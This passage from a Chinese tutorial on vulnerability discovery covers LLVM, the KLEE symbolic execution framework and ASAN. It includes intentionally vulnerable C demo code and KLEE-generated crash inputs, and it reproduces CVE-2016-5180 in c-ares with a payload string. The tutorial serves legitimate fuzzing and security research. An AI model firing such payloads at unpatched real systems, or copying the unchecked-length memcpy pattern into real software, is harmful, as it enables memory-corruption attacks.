/// VariableExprAST - Expression class for referencing a variable, like &quot;a&quot;.
class VariableExprAST : public ExprAST {
  std::string Name;

public:
  VariableExprAST(const std::string &amp;Name) : Name(Name) {}

  Value *codegen() override;
};

</code></pre>
<h2 id="llvm-基本命令"><a class="header" href="#llvm-基本命令">LLVM 基本命令</a></h2>
<h2 id="深入了解observer-llvm-原理"><a class="header" href="#深入了解observer-llvm-原理">深入了解Observer-LLVM 原理</a></h2>
<h2 id="llvm-instrument-模块"><a class="header" href="#llvm-instrument-模块">LLVM Instrument 模块</a></h2>
<h2 id="llvm-analayis-模块"><a class="header" href="#llvm-analayis-模块">LLVM Analayis 模块</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="11-klee符号执行框架"><a class="header" href="#11-klee符号执行框架">11. KLEE符号执行框架</a></h1>
<ul>
<li><a href="9.klee.html#%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7">必备工具</a></li>
<li><a href="9.klee.html#%E4%BB%80%E4%B9%88%E6%98%AFklee-%E5%92%8Cklee-%E7%9A%84%E7%94%A8%E5%A4%84">什么是KLEE 和KLEE 的用处</a></li>
<li><a href="9.klee.html#klee-%E5%AE%89%E8%A3%85%E8%BF%87%E7%A8%8B">KLEE 安装过程</a></li>
<li><a href="9.klee.html#%E6%8A%8A%E7%A8%8B%E5%BA%8F%E7%BC%96%E8%AF%91%E4%B8%BAllvm-ir">把程序编译为LLVM IR</a></li>
<li><a href="9.klee.html#klee-%E5%91%BD%E4%BB%A4%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95">KLEE 命令基本用法</a></li>
<li><a href="9.klee.html#klee-%E6%A1%86%E6%9E%B6%E4%B8%AD%E7%9A%84klee_make_symbolic">KLEE 框架中的klee_make_symbolic()</a></li>
<li><a href="9.klee.html#%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%90%86%E8%A7%A3klee-%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B">进一步理解KLEE 执行过程</a></li>
<li><a href="9.klee.html#%E5%A6%82%E4%BD%95%E5%9C%A8%E5%AE%9E%E9%99%85%E4%B8%AD%E5%BA%94%E7%94%A8klee">如何在实际中应用KLEE</a></li>
<li><a href="9.klee.html#whole-program-llvm">Whole-program-llvm</a></li>
</ul>
<h2 id="必备工具-8"><a class="header" href="#必备工具-8">必备工具</a></h2>
<p>clang ,LLVM ,KLEE (https://github.com/klee/klee.git )</p>
<h2 id="什么是klee-和klee-的用处"><a class="header" href="#什么是klee-和klee-的用处">什么是KLEE 和KLEE 的用处</a></h2>
<p>在第六第七章我们已经了解到符号执行的基本原理并使用Triton 来实现一些简单的demo ,本章我们了解的KLEE 框架也是符号执行框架,与Triton 不同之处在于KLEE 能够根据源码编译出的LLVM IR 来发掘漏洞.使用KLEE 框架的程序有很多,比如在CGC (Cyber Grand Challenge ,详情参考:https://www.freebuf.com/articles/neopoints/111712.html )比赛上大获成功的S2E (http://s2e.systems/docs/s2e-env.html ).</p>
<p>KLEE 适用于二进制的符号执行,之所以它能够支持跨平台汇编执行最关键的一点在于KLEE 使用LLVM IR 作为语句执行(因为各个平台的汇编指令不相同,如果要编写各个平台都适用的符号执行工具工作量会很大,但是LLVM IR 能够把它们作为中间语言来等价表达).所以我们是需要依赖源码编译为LLVM ByteCode 的,如果你要在二进制程序下使用KLEE 的话,那就需要使用rev.ng (https://github.com/revng/revng )把二进制程序转换为LLVM IR 然后再给KLEE 执行.</p>
<h2 id="klee-安装过程"><a class="header" href="#klee-安装过程">KLEE 安装过程</a></h2>
<p>安装KLEE 时会有一些坑,其实影响最明显的坑就是使用不同版本的LLVM 时编译KLEE 会产生一些意想不到的问题.所以笔者推荐在KLEE 2.0 下搭配LLVM 6.0 编译,KLEE 1.4 搭配LLVM 3.8 编译.</p>
<p>第一步下载LLVM 库代码,地址在https://github.com/llvm-mirror/llvm</p>
<pre><code class="language-shell">git clone --branch release_60 https://github.com/llvm-mirror/llvm
cd llvm
mkdir build
cd build
cmake ..
sudo make install -j12
</code></pre>
<p>接下来下载KLEE ,地址在https://github.com/klee/klee</p>
<pre><code class="language-shell">git clone https://github.com/klee/klee.git
cd klee
mkdir build
cd build
cmake .. -DENABLE_UNIT_TESTS=OFF -DENABLE_SYSTEM_TESTS=OFF
sudo make install -j12
</code></pre>
<p>编译好之后,我们就可以使用KLEE 了</p>
<h2 id="把程序编译为llvm-ir"><a class="header" href="#把程序编译为llvm-ir">把程序编译为LLVM IR</a></h2>
<p>前面说到,KLEE 使用LLVM IR 进行符号执行,那么我们则需要在编译时插入参数<code>-emit-llvm -S</code> ,示例demo 如下:</p>
<pre><code class="language-c">//  test_code.c

#include &lt;memory.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

char* get_message(const char* message) {
	if (strlen(message) &lt;= 4)
		return NULL;

	if (!('F' == message[0] &amp;&amp; '\x1' == message[1]))
		return NULL;

	unsigned int message_length = *(unsigned int*)&amp;message[2];
	char* output_message = (char*)malloc(message_length);

	memcpy(output_message,&amp;message[2],message_length);

	return output_message;
}

int main(int argc,char** argv) {
	char input_buffer[0x10] = {0};

	scanf(&quot;%s&quot;,input_buffer);

	char* message_data = get_message(input_buffer);

	if (NULL == message_data)
		printf(&quot;Error for resolve message\n&quot;);
	else
		printf(&quot;message data : %s\n&quot;,message_data);

	return 0;
}

</code></pre>
<p>需要注意的是,要编译LLVM IR 需要使用clang 而不是GCC 编译器,编译命令如下:</p>
<pre><code class="language-shell">
clang -emit-llvm -c test_code.c

</code></pre>
<h2 id="klee-命令基本用法"><a class="header" href="#klee-命令基本用法">KLEE 命令基本用法</a></h2>
<p>然后就可以生成<code>test_code.bc</code> 文件了,我们把它传递给KLEE 执行,KLEE 会创建新目录并保存测试数据到这里.</p>
<pre><code class="language-shell">
MacBook-Pro-2:bin root$ klee -libc=klee test_code.bc
KLEE: output directory is &quot;/Users/_/Desktop/code_file/klee_master/build/bin/klee-out-1&quot;
KLEE: Using Z3 solver backend
KLEE: WARNING: undefined reference to function: __memcpy_chk
KLEE: WARNING: undefined reference to function: printf
KLEE: WARNING: undefined reference to function: scanf
KLEE: WARNING ONCE: calling external: scanf(4623811640, 4623820064) at [no debug info]
k
KLEE: WARNING ONCE: calling external: printf(4624019712) at [no debug info]
Error for resolve message

KLEE: done: total instructions = 273
KLEE: done: completed paths = 1
KLEE: done: generated tests = 1
MacBook-Pro-2:bin root$ klee -libc=klee test_code.bc
KLEE: output directory is &quot;/Users/_/Desktop/code_file/klee_master/build/bin/klee-out-2&quot;
KLEE: Using Z3 solver backend
KLEE: WARNING: undefined reference to function: __memcpy_chk
KLEE: WARNING: undefined reference to function: printf
KLEE: WARNING: undefined reference to function: scanf
KLEE: WARNING ONCE: calling external: scanf(4606362680, 4606371104) at [no debug info]
AAAAAAAAAAAAAAAAAAAAA
KLEE: ERROR: /Users/_/Desktop/source/klee/runtime/klee-libc/strlen.c:14: memory error: out of bound pointer
KLEE: NOTE: now ignoring this error at this location

KLEE: done: total instructions = 372
KLEE: done: completed paths = 1
KLEE: done: generated tests = 1

</code></pre>
<p>因为程序调用了scanf() 函数,我们需要手动给它填写一些参数进去,第一次使用klee 执行程序时在scanf() 传递字符k 并没有触发崩溃,但是在第二次使用klee 执行时输入AAAAAAAAAAAAAAAAAAAAA 导致了KLEE 的内部实现strlen() 函数报错了,我们可以在klee-out-2 目录查看细节.</p>
<pre><code class="language-shell">
MacBook-Pro-2:bin root$ cd klee-out-2/
MacBook-Pro-2:klee-out-2 root$ ls
assembly.ll             messages.txt            run.stats               test000001.ktest        warnings.txt
info                    run.istats              test000001.kquery       test000001.ptr.err

</code></pre>
<p>我们看到文件夹里的test000001.ptr.err 文件,它的意思是strlen() 的崩溃信息</p>
<pre><code class="language-shell">
Error: memory error: out of bound pointer
File: /Users/fc/Desktop/source/klee/runtime/klee-libc/strlen.c
Line: 14
assembly.ll line: 135
Stack:
        #000000135 in strlen (=4606371104) at /Users/fc/Desktop/source/klee/runtime/klee-libc/strlen.c:14
        #100000018 in get_message (=4606371104)
        #200000096 in main (=1, =4606715776)
Info:
        address: 4606371120
        next: object at 4606362472 of size 8
                MO9[8] allocated at main():  %3 = alloca i32, align 4

</code></pre>
<p>使用ktest-tool 查看test 样本的信息:</p>
<pre><code class="language-shell">
MacBook-Pro-2:klee-out-2 root$ ktest-tool test000001.ktest
ktest file : 'test000001.ktest'
args       : ['test_code.bc']
num objects: 0

</code></pre>
<p>使用klee-stats 查看当前本次测试的状态:</p>
<pre><code class="language-shell">
MacBook-Pro-2:klee-out-2 root$ klee-stats .
---------------------------------------------------------------------
| Path |  Instrs|  Time(s)|  ICov(%)|  BCov(%)|  ICount|  TSolver(%)|
---------------------------------------------------------------------
|  .   |     372|     8.49|    54.62|    25.00|     119|        0.00|
---------------------------------------------------------------------

</code></pre>
<h2 id="klee-框架中的klee_make_symbolic"><a class="header" href="#klee-框架中的klee_make_symbolic">KLEE 框架中的klee_make_symbolic()</a></h2>
<p>在前面的这个例子,我们并不能很好的了解到KLEE 的强大之处,接下来将要介绍的KLEE 的基本用法,自动对输入进行追踪测试.继续回顾上面的代码例子:</p>
<pre><code class="language-c">
#include &lt;memory.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

char* get_message(const char* message) {
	if (strlen(message) &lt;= 4)
		return NULL;

	if (!('F' == message[0] &amp;&amp; '\x1' == message[1]))
		return NULL;

	unsigned int message_length = *(unsigned int*)&amp;message[2];
	char* output_message = (char*)malloc(message_length);

	memcpy(output_message,&amp;message[2],message_length);

	return output_message;
}

int main(int argc,char** argv) {
	char input_buffer[0x10] = {0};

	scanf(&quot;%s&quot;,input_buffer);

	char* message_data = get_message(input_buffer);

	if (NULL == message_data)
		printf(&quot;Error for resolve message\n&quot;);
	else
		printf(&quot;message data : %s\n&quot;,message_data);

	return 0;
}

</code></pre>
<p>在这个代码例子里,我们要特别关注scanf() 函数,因为scanf() 函数是我们的输入点,在KLEE 里,对于这种用户可控的输入的,我们需要手工给它们打上标记,KLEE 提供一个函数,声明如下:</p>
<pre><code class="language-c">
void klee_make_symbolic(void *array, size_t nbytes, const char *name);
//  klee_make_symbolic(内存地址,内存大小,变量名字);

</code></pre>
<p>我们修改上面的函数如下,替换scanf() 为klee_make_symbolic() .部分代码如下:</p>
<pre><code class="language-c">
#include &lt;memory.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#include &quot;klee/klee.h&quot;


char* get_message(const char* message) {
	if (strlen(message) &lt;= 4)
		return NULL;

	if (!('F' == message[0] &amp;&amp; '\x1' == message[1]))
		return NULL;

	unsigned int message_length = *(unsigned int*)&amp;message[2];
	char* output_message = (char*)malloc(message_length);

	memcpy(output_message,&amp;message[2],message_length);

	return output_message;
}

int main(int argc,char** argv) {
	char input_buffer[0x10] = {0};

	klee_make_symbolic(input_buffer,sizeof(input_buffer),&quot;input_buffer&quot;);

	char* message_data = get_message(input_buffer);

	if (NULL == message_data)
		printf(&quot;Error for resolve message\n&quot;);
	else
		printf(&quot;message data : %s\n&quot;,message_data);

	return 0;
}

</code></pre>
<p>编译命令如下(注意,因为klee/klee.h 库可能没有被复制到/usr/include 中,所以需要手工-I 为klee.h 指定路径):</p>
<pre><code class="language-shell">
MacBook-Pro-2:bin root$ clang -emit-llvm -c -I ../../include/ test_new_code.c

</code></pre>
<p>接下来我们继续执行KLEE ,效果如下:</p>
<pre><code class="language-shell">
MacBook-Pro-2:bin root$ klee -libc=klee test_new_code.bc
KLEE: output directory is &quot;/Users/_/Desktop/code_file/klee_master/build/bin/klee-out-3&quot;
KLEE: Using Z3 solver backend
KLEE: WARNING: undefined reference to function: __memcpy_chk
KLEE: WARNING: undefined reference to function: printf
KLEE: WARNING ONCE: calling external: printf(4470092000) at [no debug info]
Error for resolve message
Error for resolve message
Error for resolve message
Error for resolve message
Error for resolve message
Error for resolve message
Error for resolve message
KLEE: ERROR: (location information missing) concretized symbolic size
KLEE: NOTE: now ignoring this error at this location
KLEE: WARNING ONCE: Alignment of memory from call &quot;malloc&quot; is not modelled. Using alignment of 8.
Error for resolve message
KLEE: NOTE: found huge malloc, returning 0
KLEE: WARNING ONCE: Large alloc: 33554431 bytes.  KLEE may run out of memory.
Error for resolve message
KLEE: WARNING ONCE: calling external: __memcpy_chk(4484030464, 4469892434, (ZExt w64 (ReadLSB w32 2 input_buffer)), 18446744073709551615) at [no debug info]
Error for resolve message
message data :
KLEE: ERROR: (location information missing) external call with symbolic argument: __memcpy_chk
KLEE: NOTE: now ignoring this error at this location
Error for resolve message
message data :
Error for resolve message
KLEE: NOTE: found huge malloc, returning 0
KLEE: NOTE: found huge malloc, returning 0
Error for resolve message
message data :
Error for resolve message
message data :
Error for resolve message
Error for resolve message
KLEE: NOTE: found huge malloc, returning 0
KLEE: NOTE: found huge malloc, returning 0
Error for resolve message
message data :
Error for resolve message
Error for resolve message
KLEE: NOTE: found huge malloc, returning 0
message data :
Error for resolve message
Error for resolve message
message data :
KLEE: NOTE: found huge malloc, returning 0
KLEE: NOTE: found huge malloc, returning 0
Error for resolve message
message data :
Error for resolve message
KLEE: ERROR: /Users/_/Desktop/source/klee/runtime/klee-libc/strlen.c:14: memory error: out of bound pointer
KLEE: NOTE: now ignoring this error at this location
message data :
KLEE: NOTE: found huge malloc, returning 0
Error for resolve message
Error for resolve message
KLEE: NOTE: found huge malloc, returning 0
Error for resolve message
Error for resolve message
message data :
message data :

KLEE: done: total instructions = 1312
KLEE: done: completed paths = 60
KLEE: done: generated tests = 41

</code></pre>
<p>我们来查看KLEE 的输出结果:</p>
<pre><code class="language-shell">
MacBook-Pro-2:klee-out-3 root$ ls
assembly.ll             test000004.ktest        test000010.ktest        test000016.ktest        test000024.ktest        test000032.ktest        test000038.ktest
info                    test000005.ktest        test000011.exec.err     test000017.ktest        test000025.ktest        test000033.ktest        test000039.ktest
messages.txt            test000006.ktest        test000011.kquery       test000018.ktest        test000026.ktest        test000034.kquery       test000040.ktest
run.istats              test000007.kquery       test000011.ktest        test000019.ktest        test000027.ktest        test000034.ktest        test000041.ktest
run.stats               test000007.ktest        test000012.ktest        test000020.ktest        test000028.ktest        test000034.ptr.err      warnings.txt
test000001.ktest        test000007.model.err    test000013.ktest        test000021.ktest        test000029.ktest        test000035.ktest
test000002.ktest        test000008.ktest        test000014.ktest        test000022.ktest        test000030.ktest        test000036.ktest
test000003.ktest        test000009.ktest        test000015.ktest        test000023.ktest        test000031.ktest        test000037.ktest

</code></pre>
<p>从文件列表可以知道,本次测试发现了两处崩溃,我们使用ktest-tool 分别查看它们的信息:</p>
<pre><code class="language-shell">
MacBook-Pro-2:klee-out-3 root$ ktest-tool test000007.ktest
ktest file : 'test000007.ktest'
args       : ['test_new_code.bc']
num objects: 1
object 0: name: 'input_buffer'
object 0: size: 16
object 0: data: b'F\x01\xff\xff\xff\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'
object 0: hex : 0x4601ffffff00ffffffffffffffffffff
object 0: text: F...............
MacBook-Pro-2:klee-out-3 root$ ktest-tool test000034.ktest
ktest file : 'test000034.ktest'
args       : ['test_new_code.bc']
num objects: 1
object 0: name: 'input_buffer'
object 0: size: 16
object 0: data: b'\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff'
object 0: hex : 0xffffffffffffffffffffffffffffffff
object 0: text: ................
MacBook-Pro-2:klee-out-3 root$ ktest-tool test000011.ktest
ktest file : 'test000011.ktest'
args       : ['test_new_code.bc']
num objects: 1
object 0: name: 'input_buffer'
object 0: size: 16
object 0: data: b'F\x01\xff\xff\xff\xff\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff'
object 0: hex : 0x4601ffffffff00ffffffffffffffffff
object 0: text: F..............

</code></pre>
<p>有了这些Payload ,我们使用ASAN 来验证一下这些测试用例是否是正确的,修改代码如下:</p>
<pre><code class="language-c">
#include &lt;memory.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#include &quot;klee/klee.h&quot;


char* get_message(const char* message) {
	if (strlen(message) &lt;= 4)
		return NULL;

	if (!('F' == message[0] &amp;&amp; '\x1' == message[1]))
		return NULL;

	unsigned int message_length = *(unsigned int*)&amp;message[2];
	char* output_message = (char*)malloc(message_length);

	memcpy(output_message,&amp;message[2],message_length);

	return output_message;
}

int main(int argc,char** argv) {
	char* message_data = get_message(&quot;F\x01\xff\xff\xff\x00\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\0&quot;); //(input_buffer);

	if (NULL == message_data)
		printf(&quot;Error for resolve message\n&quot;);
	else
		printf(&quot;message data : %s\n&quot;,message_data);

	return 0;
}

</code></pre>
<p>编译并执行程序,观察ASAN 会不会报错和产生的报错信息:</p>
<pre><code class="language-shell">
MacBook-Pro-2:bin root$ clang -fsanitize=address test_asan_code.c -o test_asan_code
MacBook-Pro-2:bin root$ ./test_asan_code
=================================================================
==29638==ERROR: AddressSanitizer: global-buffer-overflow on address 0x0001034dee52 at pc 0x00010353b59f bp 0x7ffeec721a40 sp 0x7ffeec7211f0
READ of size 16777215 at 0x0001034dee52 thread T0
    #0 0x10353b59e in __asan_memcpy (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x5459e)
    #1 0x1034decd3 in get_message (test_asan_code:x86_64+0x100000cd3)
    #2 0x1034ded14 in main (test_asan_code:x86_64+0x100000d14)
    #3 0x7fff790c1014 in start (libdyld.dylib:x86_64+0x1014)

0x0001034dee52 is located 0 bytes to the right of global variable '&lt;string literal&gt;' defined in 'test_asan_code.c:26:35' (0x1034dee40) of size 18
SUMMARY: AddressSanitizer: global-buffer-overflow (libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x5459e) in __asan_memcpy
Shadow bytes around the buggy address:
  0x10002069bd70: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10002069bd80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10002069bd90: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10002069bda0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10002069bdb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=&gt;0x10002069bdc0: 00 00 00 00 00 00 00 00 00 00[02]f9 f9 f9 f9 f9
  0x10002069bdd0: 00 00 00 00 00 00 00 03 f9 f9 f9 f9 00 00 03 f9
  0x10002069bde0: f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00
  0x10002069bdf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10002069be00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x10002069be10: 00 00 00 00 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==29638==ABORTING
Abort trap: 6

</code></pre>
<h2 id="进一步理解klee-执行过程"><a class="header" href="#进一步理解klee-执行过程">进一步理解KLEE 执行过程</a></h2>
<p>KLEE 框架的整体原理是通过一个状态上下文(状态上下文对象维护栈堆,函数调用和符号对象等重要信息)和解析器.本节着重于深入解析器的实现原理.</p>
<p>KLEE 的解析器代码位于<code>/lib/Core/Executor.cpp!Executor::executeInstruction()</code> 函数里,该函数主要是模拟操作LLVM IR 指令的操作并根据相关的操作变成符号对象并保存到内存对象中:</p>
<pre><code class="language-c++">
 // ... 省略无关代码

  case Instruction::Add: {
    ref&lt;Expr&gt; left = eval(ki, 0, state).value;  //  获取该值,因为这个值可能是数字或者是一个符号
    ref&lt;Expr&gt; right = eval(ki, 1, state).value;
    bindLocal(ki, state, AddExpr::create(left, right));  //  AddExpr::create() 的意思是创建一个Add 符号对象
    break;
  }

  case Instruction::Sub: {
    ref&lt;Expr&gt; left = eval(ki, 0, state).value;
    ref&lt;Expr&gt; right = eval(ki, 1, state).value;
    bindLocal(ki, state, SubExpr::create(left, right));
    break;
  }

  case Instruction::Mul: {
    ref&lt;Expr&gt; left = eval(ki, 0, state).value;
    ref&lt;Expr&gt; right = eval(ki, 1, state).value;
    bindLocal(ki, state, MulExpr::create(left, right));
    break;
  }

  case Instruction::UDiv: {
    ref&lt;Expr&gt; left = eval(ki, 0, state).value;
    ref&lt;Expr&gt; right = eval(ki, 1, state).value;
    ref&lt;Expr&gt; result = UDivExpr::create(left, right);
    bindLocal(ki, state, result);
    break;
  }

 // ... 省略无关代码

</code></pre>
<p>理解了KLEE 的模拟执行原理,请思考一下:<strong>如果程序调用到了系统函数,那应该怎么办呢,我们的符号化过程不就会在这里缺失了记录吗</strong>.答案是肯定的,所以KLEE 使用uclibc (https://github.com/klee/klee-uclibc )来导入libc 的函数,<strong>因为系统中的libc 库是已经编译好的,不能作为LLVM IR 传递给KLEE 继续符号化,于是我们应该通过libc 库的源码去编译出一个LLVM IR 的代码库,这样才能够让KLEE 执行</strong>.</p>
<p>细心的读者一定会注意到,笔者在前面的KLEE 命令中额外添加了一个参数<code>-libc=klee</code> ,它的意义在于使用klee 自带的libc 库引入到执行环境中.KLEE 中自带的libc 库函数并不多,所以在执行更大的程序中还是需要依赖uclibc ,建议在Ubuntu 下编译uclibc ,然后再使用<code>klee -libc=uclibc</code>引入它.</p>
<h2 id="如何在实际中应用klee"><a class="header" href="#如何在实际中应用klee">如何在实际中应用KLEE</a></h2>
<p>前面介绍到KLEE 的基本命令和基本原理,那么我们就需要在实地中应用它来做一些漏洞挖掘的工作.很遗憾的是,KLEE 并不能在任何项目都能够完全使用,这是因为LLVM 的历史遗留问题(参考笔者提的issus : https://github.com/klee/klee/issues/1091 ),简单地说是因为KLEE 需要对一些内置函数进行重写成LLVM 代码,但是LLVM 在编译时大部分的内置函数时链接GCC 的内置函数库,导致了KLEE 不能对这些内置函数进行等价的LLVM IR 转换(目前KLEE 和LLVM 有做一部分内置函数处理,但是因为内置函数太多所以没有完全支持,当跑一些图像处理库时会调用一些矩阵操作的函数,KLEE 和LLVM 都不支持这些函数),这是我碰到的一个例子和分析:</p>
<p><img src="pic9/pic1.png" alt="" /></p>
<p>除开这个比较大的坑之外,跑一些相对较小的程序(比如协议处理,反序列化数据这种)KLEE 的威力还是很不错的,接下来我们复现CVE-2016-5180(https://c-ares.haxx.se/adv_20160929.html )</p>
<p>对于这种工程化的项目,一般我们都是使用./configure cmake 等来生成makefile 然后编译的,如果我们直接在CFLAGS/CXXFLAGS 里面插入<code>-emit-llvm -c</code> 会遇到一个很常见的问题,那就是在编译的时候出错.</p>
<p>案例一:</p>
<p><img src="pic9/pic2.png" alt="" /></p>
<p>案例二:</p>
<p><img src="pic9/pic3.png" alt="" /></p>
<p>因为应对这个问题,笔者写了一个工具,使用的就是AFL 的原理,在最后构造编译命令的时候插入<code>-emit-llvm -c</code> 参数,并在在链接时生成bca 文件(LLVM IR 静态代码库),代码地址在: https://github.com/lcatro/klee-fl ,执行脚本<code>sh ./build_kleefl.sh</code>.</p>
<p>省去klee-fl 的编译过程,我们以klee-fl 里面的c-ares 为例子,首先使用./buildconf 来生成./configure 文件.</p>
<pre><code class="language-shell">
MacBook-Pro-2:save_code root$ ./buildconf

</code></pre>
<p>在./configure 阶段时,我们就需要指定CC 为klee-clang 让我们自定义的编译器插入编译参数.</p>
<pre><code class="language-shell">
MacBook-Pro-2:code_file root$ ./configure CC=klee-clang
MacBook-Pro-2:code_file root$ make

</code></pre>
<p>klee-fl 应用了libFuzzer 的思想,给定一个入口KleeFuzzingEntry (在libFuzzer 里为LLVMFuzzerTestOneInput ),构造代码如下:</p>
<pre><code class="language-c">
#include &lt;ares.h&gt;
#include &lt;nameser.h&gt;


int KleeFuzzingEntry(int argc,char** argv) {
  unsigned char *output_buffer;
  int output_buflen;
  unsigned char input_buffer[64] = {0};

  klee_make_symbolic(&amp;input_buffer, sizeof(input_buffer), &quot;input_buffer&quot;);  //  把input_buffer 作为输入求解

  ares_create_query(input_buffer, ns_c_in, ns_t_a, 0x1234, 0, &amp;output_buffer, &amp;output_buflen, 0);

  return 0;
}

</code></pre>
<p>然后编译Klee-Fuzzer ,编译命令如下:</p>
<pre><code class="language-shell">
MacBook-Pro-2:c-ares root$ klee-build ./klee_fuzzer.c .

</code></pre>
<p>最后一步就是使用<code>sh run_fuzz.sh</code> 执行编译出来的Klee-Fuzzer ,效果如下:</p>
<p><img src="pic9/pic4.png" alt="" /></p>
<p>可以看到KLEE 提示<code>out of bound pointer</code> 找到一处越界.接下来使用ktest-tool 查看Payload :</p>
<p><img src="pic9/pic5.png" alt="" /></p>
<p>最后,我们来复现Payload 是否有效,代码如下:</p>
<pre><code class="language-c">
#include &lt;ares.h&gt;
#include &lt;nameser.h&gt;

#define PAYLOAD &quot;\\.\x00\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\&quot;

int main(int argc,char** argv) {
        unsigned char* output_buffer;
        int output_buflen;

        ares_create_query(PAYLOAD, ns_c_in, ns_t_a, 0x1234, 0, &amp;output_buffer, &amp;output_buflen, 0);

        return 0;
}

</code></pre>
<p>启用ASAN 编译:</p>
<pre><code class="language-shell">
MacBook-Pro-2:c-ares root$ make CFLAGS=&quot;-fsanitize=address&quot;
MacBook-Pro-2:c-ares root$ clang -fsanitize=address valid.c libcares_la-*.o  -o valid

</code></pre>
<p>验证结果如下:</p>
<p><img src="pic9/pic6.png" alt="" /></p>
<h2 id="whole-program-llvm"><a class="header" href="#whole-program-llvm">Whole-program-llvm</a></h2>
<div style="break-before: page; page-break-before: always;"></div><h1 id="12-chapter-1"><a class="header" href="#12-chapter-1">12. Chapter 1</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="13-libfuzzer-asan"><a class="header" href="#13-libfuzzer-asan">13. Libfuzzer Asan</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="131-深入解析libfuzzer与asan"><a class="header" href="#131-深入解析libfuzzer与asan">13.1. 深入解析libfuzzer与asan</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="132-libfuzzer-asan"><a class="header" href="#132-libfuzzer-asan">13.2. Libfuzzer Asan</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h2 id="asan原理-1"><a class="header" href="#asan原理-1">ASAN原理</a></h2>
<p>读过libFuzzer-workshop或者有libFuzzer使用经验的读者应该对以下的命令很熟悉</p>
<pre><code class="language-sh">clang++ -g openssl_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address \
    -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-gep,trace-div \
    -Iopenssl1.0.1f/include openssl1.0.1f/libssl.a openssl1.0.1f/libcrypto.a \
    ../../libFuzzer/libFuzzer.a -o openssl_fuzzer
</code></pre>
<p>我们在引入libFuzzer时,还会引入ASAN(clang命令参数-fsanitize=address).也就是说,我们使用libFuzzer作为Fuzzer驱动,进行接口构造调用/数据生成/路径探测,然后使用ASAN作为内存异常检测工具.下面是使用ASAN的简单例子:</p>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ cat ./test_case_2.c
#include &lt;stdio.h&gt;

int main() {
    char buffer[10] = {0};

    printf(&quot;Try Crash!\n&quot;);
    buffer[10] = 'C';
    printf(&quot;Oops \n&quot;);

    return 1;
}
ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ clang ./test_case_2.c -o ./test_case_2 &amp;&amp; ./test_case_2
Try Crash!
Oops
ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ clang -fsanitize=address ./test_case_2.c -o ./test_case_2 &amp;&amp; ./test_case_2
Try Crash!
=================================================================
==520651==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffeea008e8a at pc 0x0000004c5098 bp 0x7ffeea008e50 sp 0x7ffeea008e48
WRITE of size 1 at 0x7ffeea008e8a thread T0
    #0 0x4c5097 in main (/home/ubuntu/Desktop/instrument_note/test_case_2+0x4c5097)
    #1 0x7fbfa3d56cb1 in __libc_start_main csu/../csu/libc-start.c:314:16
    #2 0x41b2bd in _start (/home/ubuntu/Desktop/instrument_note/test_case_2+0x41b2bd)

Address 0x7ffeea008e8a is located in stack of thread T0 at offset 42 in frame
    #0 0x4c4f5f in main (/home/ubuntu/Desktop/instrument_note/test_case_2+0x4c4f5f)
...
</code></pre>
<p>本章着重于探索ASAN的实现原理,关于ASAN的更深入用法建议参考官方文档(https://clang.llvm.org/docs/AddressSanitizer.html ;https://github.com/google/sanitizers/wiki/AddressSanitizer ).</p>
<h4 id="asan异常检测原理-1"><a class="header" href="#asan异常检测原理-1">ASAN异常检测原理</a></h4>
<p>使用前面的演示例子,当buffer越界时,它必然会修改越界后内存的数据(...虽然这句是废话,但还是要提一下).我们用gdb调试没有引入ASAN编译的示例代码:</p>
<pre><code class="language-text">(gdb) n
Try Crash!
10	    buffer[10] = 'C';
(gdb) info local
buffer = &quot;\000\000\000\000\000\000\000\000\000&quot;
(gdb) x /16x buffer
0x7fffffffdfb2:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
